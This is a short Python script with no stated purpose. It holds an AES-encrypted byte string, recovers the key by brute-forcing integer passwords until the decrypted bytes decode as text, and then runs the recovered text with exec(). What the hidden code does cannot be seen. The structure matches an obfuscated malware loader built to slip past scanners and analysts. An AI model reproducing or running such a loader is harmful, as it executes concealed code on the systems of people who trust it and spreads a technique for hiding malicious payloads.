from Crypto import Random
from Crypto.Cipher import AES
import hashlib

class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'\x9a\xfc\xdb\x89S\xb1\xabRWuJ\xdd\x9a\xbf\xe7\xccs\xc7\x936\'\x17o{\xad%5Hj\x86@\t\t\xc9\x02\xf2\x08[\x17G\xa44yQX\tUe\x01lje#_>\x07k\xe8/\x9bt\x85\x8b\xd7\xc9\x87\xbf\xc4\x08B\xd8\x00\xaaR:\xea\x13\xae\x12\xb5\'\x02\x1d~\xc4\xe6\x96\xa8b@\xff\xe0\xc7\xf9\x84\xdb\x94\x93ev\x8f\x1d\x8f\x1b\xcc\xecc&\x87\xe7\x11\x9a`\xde\x15\xe6\xa9G{\x06\x9d\x05VP9\x8b\xaf\xea\xc9\xe9\xb9\xa9\r\xc8x@\x11\xbd\xf7Q\x1a\xb1V\x9b\xa6\x86(Ct\xf1NE\x7f\x1d\xccs\xe5` \xbe\x08m\x9e\x06/;\xa9a%\xe7\xab\xe4&\x0cD\xff\x85\x95\\\xcf\x90\x10\xad\x10\x9e\x98\xd3W\xd9\xd0\x98\xf4\x87\x8b\xd4m\t\xc4\x8a\x0f\xc0Xn\xdakdg\xc2\'\xe9ng\x14\xef\xeeBX +\x86\xecW\x84*-@}~\x90\xd7<\x87\xf9X]}.\x84\x94\x92\x91d\xa0\xa7\xfa\x7f\x97^\xbb ]\xab\t\xb4\x19\x81\xbe\x87\x0f\xc5\x04\xe8\x88\xbf$\xe3\xe0\xe4Kl~\xca*\x85&\xbdy7\xa3\x85\x98>\xd3F\xaa\xdei\x11C#nl\xfc\x87\x0f\xac\xa5\xdc\xbf\xa9\xdc_\xcaP$K\x16DJ\x04p\n\xde\x16\xc8\xbc\xdf!\x8e\xd7J\xff!\xdb*\xe3}\'\xc0\xd8\xe9\xf1+\xb5\x8e\xee3$\xce=\x10U\xc7\xfb\xb9\xf2\x88\x8f~\xf1\x04p\x7f\xd69\xc8\xfe\x99\x93\xc6\xfc\xcdL\x03\xad\x8e\xba\x8f\x0eU\xab\xa3\xecN\xee\xebQ\xa9\xd5\xed\xda\x85Zb\xf6\x08\xee\xea-\xbcG\xf8\x1dR\x0f\xee\xda!2c\xd5\xd6w\xfa}P\xc8U\x15\xd4W\x7f\xa2S\x19\xa1\x06\xd2\xe8\xf8\x8a\t{\x8d\xd3\xbc\x882\xccQ\x81\xfb\x87C\x80\x987h\x9f\x10\xb9z\x90\xd1\x11CGl\xc3\x10\xe0\x9f\x85\xf9U\xf8\x13\x9br\x0c=zZ\xe4\xeck\xb1U\xf1\xec}\xb7\xbdO\xf0\x89\xd5t\x87\x12\x8cn%\xb2\xa1?@\xa1\xbc\x80\xac9\xe8\xe7\xb5\x14\xa9i\xbfO\xd2\x7f5\xd5\xc2\x96r\xa8s\x1a;c\t\xf5\xce\xcd\xa6\x94H\x8a\x8d\xcb\x80G\x00b\x0eJ\xb4Q\x1a\xa8\xe0\x82-M\xa05\xa9\xe7O\x02\x03\x0cN"\x8e\x8a}\xd8\xfd\xe2\xd3\xe3%\xebP\x8c /\xe5\x19\xd1oV(\xbc\x8e\x1eB\xb8\xfbK\x11\rM\xb7\x9d\t\xa8__\xb2\x12x\xe2\xb0\x12\xc3\xfd{\x1c\xf7\xbd@I\x04M\x11*\nVfC\x1c\xab\xfe\xde\xa6\xe4\x88^i\'\x1dLury\xde\xc8mbK?;G\xe5\xe7\x19\xeb\xfd\x1d\x8b\xcf>\xc8\xcd\xfbb\x8c?\xdc\xf21\x07\x8b\xc3\x89\xc6@\xca\x1f\x87\x1a\xb1|\xd4\xdf-\xae\x17\xb6\x10!m\x05)W\xafC.\xc2\xe7\xb3\x8e\xc9_T\xb0\xcc\xbd\xf7W\xbd\xfdd\xbd\xd0.\xbbR\xbc\x84\x8c\xc7\xa0\xbd\n\x1a\x8e\x93\xfe\x01m\xc4c\x13\x81+\x9bKI\xb4V=\xce\xb9\x19a\xba\x01\x98\xe1\xc8<\x9e1\xefH\xdf;e\xdf~)\x95\xa8\xfa\x839KD\xd8\xce\xe9\xc7\xa5o\xffF,}\xf4\xda-\xc9\xe5\xe7\xa7\x18\x80\x0b\xfc\xbfl\xeb>\'\x1cE\x00\t?\x88\xea\x93FS\xe8d\x0e\x96n\xaf)8\xa6Z\x08#\x91\x01\xde$\x7f&9\xea\x10Id\xba\xbc,?E\xbe\x8fI-\xcc\xa2R\x11\x0f'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
